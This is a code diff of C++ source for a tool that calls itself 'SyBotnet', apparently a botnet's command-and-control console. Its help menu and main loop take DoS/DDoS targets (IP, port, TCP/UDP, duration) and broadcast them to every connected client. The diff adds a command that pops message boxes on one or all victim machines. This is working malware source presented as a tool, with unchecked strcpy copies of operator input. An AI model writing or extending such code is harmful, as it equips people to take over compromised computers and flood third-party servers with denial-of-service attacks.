@@ -20,7 +20,7 @@ void print_help()
 {
 	std::cout << '\n';
 	std::cout << "  SyBotnet                                         \n\n";
-	std::cout << "  > dos / ddos [s]    dos attack command           \n";
+	std::cout << "  > dos / ddos [s]    dos/ddos attack command      \n";
 	std::cout << "     -i                                            \n";
 	std::cout << "       --ip           set host address             \n";
 	std::cout << "     -p                                            \n";
@@ -34,11 +34,19 @@ void print_help()
 	std::cout << "     -t                                            \n";
 	std::cout << "       --time         set attack duration time     \n";
 	std::cout << "                                                   \n";
+	std::cout << "  > msgbox                                         \n";
+	std::cout << "     -t                                            \n";
+	std::cout << "       --text         set message box text         \n";
+	std::cout << "     -c                                            \n";
+	std::cout << "       --caption      set message box caption      \n";
+	std::cout << "     -i                                            \n";
+	std::cout << "       --id           set client id                \n";
+	std::cout << "       --id--all      send message to all client   \n";
+	std::cout << "                                                   \n";
 	std::cout << "  > del   [w]         delete client                \n";
 	std::cout << "     -i                                            \n";
 	std::cout << "       --id           set client id                \n";
-	std::cout << "     -a                                            \n";
-	std::cout << "       --all          delete all client            \n";
+	std::cout << "       --id--all      delete all client            \n";
 	std::cout << "                                                   \n";
 	std::cout << "  > clean [s]         cleanup console              \n";
 	std::cout << "                                                   \n";
@@ -172,7 +180,7 @@ int main()
 					if (check_number(result[(argc + 1)]) == true) {
 						data.port = atoi(result[(argc + 1)].c_str());
 					}
-					else if(result[(argc + 1)] == "udp" || result[(argc + 1)] == "tcp") {
+					else if (result[(argc + 1)] == "udp" || result[(argc + 1)] == "tcp") {
 						strcpy(data.proto, result[(argc + 1)].c_str());
 					}
 					else {
@@ -206,12 +214,12 @@ int main()
 					strcpy(data.ip, result[(argc + 1)].c_str());
 				}
 
-				else if (result[argc] == "-p" || result[argc] == "--port" ||  result[argc] == "--packet" || result[argc] == "--protocol")
+				else if (result[argc] == "-p" || result[argc] == "--port" || result[argc] == "--packet" || result[argc] == "--protocol")
 				{
 					if (check_number(result[(argc + 1)]) == true) {
 						data.port = atoi(result[(argc + 1)].c_str());
 					}
-					else if (result[(argc + 1)] == "udp" || result[(argc + 1)] == "tcp" || result[(argc+1)] == "--protocol") {
+					else if (result[(argc + 1)] == "udp" || result[(argc + 1)] == "tcp" || result[(argc + 1)] == "--protocol") {
 						strcpy(data.proto, result[(argc + 1)].c_str());
 					}
 					else {
@@ -233,6 +241,39 @@ int main()
 			}
 
 			for (int id = 0; id < tcp.GetTotalAccept(); id++) {
+				tcp.Send(reinterpret_cast<char*>(&data), sizeof Data, id);
+			}
+		}
+
+		else if (result[0] == "msgbox")
+		{
+			int id = 0;
+			bool is_id = false;
+
+			for (int i = 0; i < result.size(); i++)
+			{
+				if (result[i] == "-t" || result[i] == "--text") {
+					strcpy(data.first_option, result[(i + 1)].c_str());
+				}
+				else if (result[i] == "-c" || result[i] == "--caption") {
+					strcpy(data.second_option, result[(i + 1)].c_str());
+				}
+				else if (result[i] == "-i" || result[i] == "--id") {
+					is_id = true;
+					id = atoi(result[i + 1].c_str());
+				}
+				else if (result[i] == "--id--all") {
+					is_id = false;
+				}
+			}
+
+			if (!is_id)
+			{
+				for (id = 0; id < tcp.GetTotalAccept(); id++) {
+					tcp.Send(reinterpret_cast<char*>(&data), sizeof Data, id);
+				}
+			}
+			else {
 				tcp.Send(reinterpret_cast<char*>(&data), sizeof Data, id);
 			}
 		}
